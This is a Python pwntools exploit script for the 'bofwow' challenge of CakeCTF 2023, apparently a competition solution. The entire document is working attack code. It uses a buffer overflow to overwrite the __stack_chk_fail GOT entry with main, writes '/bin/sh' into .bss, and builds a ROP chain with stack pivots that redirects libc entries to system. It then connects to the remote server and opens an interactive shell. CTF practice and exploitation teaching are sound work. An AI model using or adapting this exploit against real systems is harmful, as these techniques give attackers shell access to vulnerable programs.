from pwn import *

file = ELF("./bofwow")
libc = ELF("./libc.so.6")

context.terminal = ["kitty"]
script = """
b *0x4014c6
c
"""
# p = gdb.debug("./bofwow", gdbscript=script)
p = remote("bofwow.2023.cakectf.com", 9003)

def write(addr, val):
    print(hex(addr), hex(val))
    payload =  b""
    payload += p64(val)
    payload =  payload.ljust(0x130, b"Y")
    payload += p64(addr)
    payload += b"C" * 64

    p.sendlineafter(b"? ", payload)
    p.sendlineafter(b"? ", b"0")

def set(addr, chain):
    [write(addr + i, u64(chain[i:i+8])) for i in range(0, len(chain), 8)]

ret = 0x4014c7
leave = ret - 1
poprbp = 0x00000000004012bd
load = 0x00000000004014c2
poprdi = 0x000000000002a3e5
adjust = 0x00000000004012bc

shell = file.bss(0x80)

write(file.got.__stack_chk_fail, file.sym.main)
write(shell, u64(b"/bin/sh\x00"))

log.info(f"poprdi offset: {poprdi - libc.sym.setbuf:x}")

base = 0x404440
next = None
curr = base
fixups = [(poprdi - libc.sym.setbuf, file.got.setbuf), (libc.sym.system - libc.sym.__cxa_atexit, file.got.__cxa_atexit)]
chain = b""
for fixup, addr in fixups:
    fixup %= (1 << 32)
    next = curr + 0xf8
    chain += p64(poprbp)
    chain += p64(next)
    chain += p64(load)
    write(next - 8, fixup)
    set(curr, chain)
    curr = next + 8

    chain =  b""
    chain += p64(poprbp)
    chain += p64(addr + 0x3d)
    chain += p64(adjust)

chain += p64(poprbp)
chain += p64(file.bss(0xe80 - 8))
chain += p64(leave)
set(curr, chain)

chain =  b""
chain += p64(file.plt.setbuf)
chain += p64(shell)
chain += p64(file.plt.__cxa_atexit)
set(file.bss(0xe80), chain)

payload =  b""
payload += p64(leave)
payload =  payload.ljust(0x110, b"X")
payload += p64(base - 8)
payload += p64(leave)
payload += p64(ret)
payload += p64(ret)
payload += p64(file.got.__stack_chk_fail)
payload += b"ZZZZZZZZ"
payload += b"YYYYYYYY" * 64

p.sendlineafter(b"? ", payload)
p.sendlineafter(b"? ", b"0")

p.interactive()